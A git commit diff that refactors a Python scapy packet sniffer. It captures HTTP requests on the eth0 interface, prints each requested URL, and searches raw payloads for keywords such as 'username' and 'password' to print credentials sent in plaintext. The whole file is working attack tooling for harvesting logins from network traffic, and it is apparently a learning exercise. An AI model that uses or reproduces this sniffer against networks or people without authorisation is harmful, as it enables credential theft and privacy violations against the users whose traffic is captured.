94b5a37aa9263325fe7d81a32e104958606763ad
Mário Gil <mg_mesquita@hotmail.com>
2018-07-17 11:44:30 +0100

    Refactoring code and better print statements

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -8,15 +8,27 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "login", "user", "password", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ["username", "login", "user", "password", "pass"]
-            for keyword in keywords:
-                if keyword in load:
-                    print(load)
-                    break
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url)
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
 
 
 sniff("eth0")
